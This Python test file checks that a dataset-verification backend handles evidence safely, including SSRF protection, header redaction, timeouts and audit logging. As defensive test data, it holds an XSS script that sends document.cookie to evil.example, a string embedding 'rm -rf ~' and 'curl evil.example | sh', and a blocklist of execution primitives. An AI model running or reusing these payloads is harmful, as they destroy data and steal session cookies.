"""Phase 11 Step 26 (dedicated security/resilience pass). These tests
directly assert the task's own non-negotiable rules not already
covered by `test_dataset_verification_transport.py` (SSRF/redirect/
size/MIME/HTML-stripping/no-execution in the transport module itself):
malformed evidence content, malicious/inert evidence text, secret
redaction, structural no-dynamic-execution across every Phase 11
module (not just transport), no repository cloning or dataset
download anywhere, provider timeout handling, and full auditability
of every mutating action.
"""

from __future__ import annotations

import importlib
import inspect
import re
from pathlib import Path

import pytest

from backend.core.config import Settings
from backend.database.migrations import initialize_database
from backend.database.repositories import AuditLogRepository
from backend.database.repositories.dataset_verification import DatasetVerificationRepository
from backend.database.repositories.external_dataset_discovery import (
    ExternalDatasetDiscoveryRepository,
)
from backend.services.dataset_verification_evidence_service import (
    ExternalDatasetEvidenceService,
    ExternalDatasetLicenceService,
)
from backend.services.dataset_verification_permission_service import (
    ExternalDatasetPermissionAssessmentService,
)
from backend.services.dataset_verification_report_service import (
    ExternalDatasetVerificationReportService,
    ExternalDatasetWithdrawalService,
)
from backend.services.dataset_verification_transport import (
    EvidenceHttpResponse,
    EvidenceRetrievalError,
    fetch_evidence,
)

ADMIN_ID = "00000000-0000-0000-0000-000000000001"

PHASE11_MODULES = (
    "core_model.data_verification",
    "backend.database.repositories.dataset_verification",
    "backend.services.dataset_verification_transport",
    "backend.services.dataset_verification_case_service",
    "backend.services.dataset_verification_evidence_service",
    "backend.services.dataset_verification_permission_service",
    "backend.services.dataset_verification_report_service",
    "backend.services.dataset_verification_source_rights_service",
    "backend.api.routes.dataset_verification",
    "core_model.admin_assistant.dataset_verification_help",
)


@pytest.fixture
def settings(tmp_path: Path) -> Settings:
    settings = Settings(
        database_path=tmp_path / "verification.db",
        database_backup_dir=tmp_path / "backups",
        allowed_data_dir=tmp_path,
        pretraining_dir=tmp_path / "core_models" / "pretraining",
        allow_external_storage=True,
        log_level="CRITICAL",
    )
    initialize_database(settings.resolved_database_path)
    return settings


def _create_case(settings: Settings, *, candidate_overrides: dict | None = None) -> dict:
    discovery = ExternalDatasetDiscoveryRepository(settings.resolved_database_path)
    session = discovery.create_session(
        {"session_code": "session-1", "requested_by_admin_public_id": ADMIN_ID}
    )
    candidate_values = {"canonical_name": "Tamil Corpus", "normalized_name": "tamil corpus"}
    candidate_values.update(candidate_overrides or {})
    candidate = discovery.create_candidate(session["public_id"], candidate_values)
    repository = DatasetVerificationRepository(settings.resolved_database_path)
    return repository.create_case(
        {
            "candidate_public_id": candidate["public_id"],
            "verification_code": "VC-1",
            "requested_by_admin_public_id": ADMIN_ID,
        }
    )


def _resolver(hostname: str) -> list[str]:
    del hostname
    return ["18.0.0.1"]


# -- structural: no dynamic execution or shell primitives anywhere in Phase 11 ----


def test_no_dynamic_execution_or_shell_primitives_in_verification_modules() -> None:
    """Mirrors Phase 10's own `test_no_dynamic_execution_or_shell_
    primitives_in_discovery_modules` -- scans every Phase 11 module
    (not just the transport layer) for dangerous primitives that would
    let untrusted evidence text run as code or a shell command.
    Matched as an actual call (`name(`), not a bare substring, so a
    docstring merely mentioning "executes" never fails this."""

    forbidden_patterns = [
        re.compile(r"(?<![.\w])eval\s*\("),
        re.compile(r"(?<![.\w])exec\s*\("),
        re.compile(r"(?<![.\w])compile\s*\("),
        re.compile(r"os\.system\s*\("),
        re.compile(r"os\.popen\s*\("),
        re.compile(r"subprocess\.(run|Popen|call|check_call|check_output)\s*\("),
        re.compile(r"pickle\.(loads|load)\s*\("),
        re.compile(r"__import__\s*\("),
        re.compile(r"shutil\.rmtree\s*\("),
    ]
    for module_name in PHASE11_MODULES:
        module = importlib.import_module(module_name)
        source = inspect.getsource(module)
        for pattern in forbidden_patterns:
            match = pattern.search(source)
            assert match is None, f"{pattern.pattern!r} matched in {module_name}: {match}"


def test_no_repository_cloning_or_dataset_file_download_anywhere() -> None:
    """No Phase 11 module ever clones a repository or downloads a
    dataset payload file -- only bounded evidence *text* snapshots
    through the one SSRF-protected transport."""

    forbidden_patterns = [
        re.compile(r"git\.(Repo\.clone_from|clone)\s*\("),
        re.compile(r"\bclone_from\s*\("),
        re.compile(r"urlretrieve\s*\("),
        re.compile(r"shutil\.copyfileobj\s*\("),
    ]
    for module_name in PHASE11_MODULES:
        module = importlib.import_module(module_name)
        source = inspect.getsource(module)
        for pattern in forbidden_patterns:
            match = pattern.search(source)
            assert match is None, f"{pattern.pattern!r} matched in {module_name}: {match}"


# -- malformed / malicious evidence content stays inert ------------------------


def test_malformed_json_evidence_is_stored_as_inert_text_never_parsed() -> None:
    """A JSON evidence response is never actually parsed/executed --
    only decoded as text, so malformed JSON causes no error and is
    simply stored verbatim (the frontend never renders it as active
    content either -- plain text only)."""

    result = fetch_evidence(
        "https://example.org/metadata.json",
        allowed_domains={"example.org"},
        resolver=_resolver,
        transport=lambda url, headers, timeout: EvidenceHttpResponse(
            status_code=200,
            headers={"content-type": "application/json"},
            body=b'{"licence": "CC-BY-4.0", invalid json here }}}',
        ),
    )
    assert result.content_text == '{"licence": "CC-BY-4.0", invalid json here }}}'


def test_malicious_html_evidence_scripts_never_survive_extraction() -> None:
    malicious = (
        b"<html><body><img src=x onerror=\"alert('xss')\">"
        b"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        b"<p>Licensed under CC-BY-4.0.</p></body></html>"
    )
    result = fetch_evidence(
        "https://example.org/card.html",
        allowed_domains={"example.org"},
        resolver=_resolver,
        transport=lambda url, headers, timeout: EvidenceHttpResponse(
            status_code=200, headers={"content-type": "text/html"}, body=malicious
        ),
    )
    assert "<script>" not in result.content_text
    assert "onerror" not in result.content_text
    assert "evil.example" not in result.content_text
    assert "CC-BY-4.0" in result.content_text


def test_embedded_shell_command_text_remains_inert_plain_text(settings: Settings) -> None:
    """Evidence text containing shell metacharacters is stored and
    returned verbatim -- it is data, never executed, never
    interpreted by a shell anywhere in the pipeline."""

    case = _create_case(settings)
    malicious_text = "Licence: CC-BY-4.0; $(rm -rf ~); `curl evil.example | sh`"
    snapshot = ExternalDatasetEvidenceService(settings).add_manual_evidence(
        case["public_id"],
        evidence_type="licence_file",
        content_text=malicious_text,
        admin_public_id=ADMIN_ID,
    )
    assert snapshot["content_text"] == malicious_text
    repository = DatasetVerificationRepository(settings.resolved_database_path)
    fetched = repository.get_evidence_snapshot(snapshot["public_id"])
    assert fetched["content_text"] == malicious_text


# -- secret redaction ---------------------------------------------------------


def test_evidence_response_headers_never_retain_authorization_or_cookies() -> None:
    """The transport's kept-header allowlist structurally excludes
    Authorization/Set-Cookie/etc -- not a redaction pass after the
    fact, but a strict allowlist before storage."""

    result = fetch_evidence(
        "https://example.org/licence.txt",
        allowed_domains={"example.org"},
        resolver=_resolver,
        transport=lambda url, headers, timeout: EvidenceHttpResponse(
            status_code=200,
            headers={
                "content-type": "text/plain",
                "authorization": "Bearer super-secret-token",
                "set-cookie": "session=abc123; HttpOnly",
                "x-api-key": "sk-should-never-be-stored",
            },
            body=b"CC-BY-4.0",
        ),
    )
    assert "authorization" not in {k.lower() for k in result.response_headers}
    assert "set-cookie" not in {k.lower() for k in result.response_headers}
    assert "x-api-key" not in {k.lower() for k in result.response_headers}
    assert "super-secret-token" not in str(result.response_headers)


def test_audit_log_metadata_is_redacted_even_if_secret_like_key_passed(settings: Settings) -> None:
    audit_repository = AuditLogRepository(settings.resolved_database_path)
    from backend.models.domain import AuditEventCreate, AuditOutcome

    audit_repository.append(
        AuditEventCreate(
            event_type="dataset_verification_evidence_collected",
            actor_type="admin",
            actor_reference=ADMIN_ID,
            action="collect_evidence",
            resource_type="external_dataset_verification_case",
            resource_public_id="case-1",
            outcome=AuditOutcome.SUCCESS,
            metadata={"api_key": "sk-super-secret", "evidence_type": "licence_file"},
        )
    )
    recent = audit_repository.recent(limit=10)
    match = next(e for e in recent if e.resource_public_id == "case-1")
    assert match.metadata["api_key"] == "[REDACTED]"
    assert match.metadata["evidence_type"] == "licence_file"


# -- provider timeout / unreachable handling -------------------------------------


def test_evidence_collection_handles_transport_timeout_gracefully(settings: Settings) -> None:
    case = _create_case(settings)
    repository = DatasetVerificationRepository(settings.resolved_database_path)
    repository.update_case(case["public_id"], {"approved_upstream_domains_json": '["example.org"]'})

    def timeout_transport(url, headers, timeout):
        return EvidenceHttpResponse(
            status_code=0, headers={}, body=b"", reachable=False, error="ConnectTimeout"
        )

    service = ExternalDatasetEvidenceService(settings, transport=timeout_transport)
    from backend.services.dataset_verification_evidence_service import DatasetVerificationError

    with pytest.raises(DatasetVerificationError):
        service.collect_evidence(
            case["public_id"],
            evidence_type="licence_file",
            source_url="https://example.org/licence.txt",
            admin_public_id=ADMIN_ID,
        )
    events = repository.list_events(case["public_id"])
    failure_events = [e for e in events if e["event_type"] == "evidence_collection_failed"]
    assert len(failure_events) == 1
    assert failure_events[0]["metadata"]["reason"] == "transport_error"


def test_default_resolver_timeout_style_failure_raises_retrievable_error() -> None:
    with pytest.raises(EvidenceRetrievalError) as excinfo:
        fetch_evidence(
            "https://example.org/x.txt",
            allowed_domains={"example.org"},
            resolver=_resolver,
            transport=lambda url, headers, timeout: EvidenceHttpResponse(
                status_code=0, headers={}, body=b"", reachable=False, error="ReadTimeout"
            ),
        )
    assert excinfo.value.reason == "transport_error"


# -- audit completeness: every mutating action writes an audit_logs entry --------


def test_every_major_mutating_action_is_audited(settings: Settings) -> None:
    audit_repository = AuditLogRepository(settings.resolved_database_path)
    case = _create_case(settings)

    ExternalDatasetEvidenceService(settings).add_manual_evidence(
        case["public_id"], evidence_type="licence_file",
        content_text="Licensed under CC-BY-4.0.", admin_public_id=ADMIN_ID,
    )
    ExternalDatasetLicenceService(settings).assess(case["public_id"], admin_public_id=ADMIN_ID)
    perm_service = ExternalDatasetPermissionAssessmentService(settings)
    perm_service.assess(case["public_id"], admin_public_id=ADMIN_ID)
    perm_service.assess_commercial_use(
        case["public_id"], intended_use_category="research", admin_public_id=ADMIN_ID
    )
    perm_service.review(
        case["public_id"], "rag_use",
        status="approved", reviewed_by=ADMIN_ID, reason="Licence confirms RAG use",
    )
    ExternalDatasetVerificationReportService(settings).finalize(
        case["public_id"], admin_public_id=ADMIN_ID
    )
    ExternalDatasetWithdrawalService(settings).record_notice(
        case["public_id"],
        {"notice_type": "licence_changed", "notice_text": "changed"},
        admin_public_id=ADMIN_ID,
    )

    recent = audit_repository.recent(limit=100)
    actions_seen = {e.action for e in recent if e.resource_public_id == case["public_id"]}
    expected_actions = {
        "add_manual_evidence",
        "assess_licence",
        "assess_permissions",
        "assess_commercial_use",
        "review_permission",
        "finalize",
        "record_withdrawal_notice",
    }
    missing = expected_actions - actions_seen
    assert not missing, f"missing audit entries for actions: {missing}"
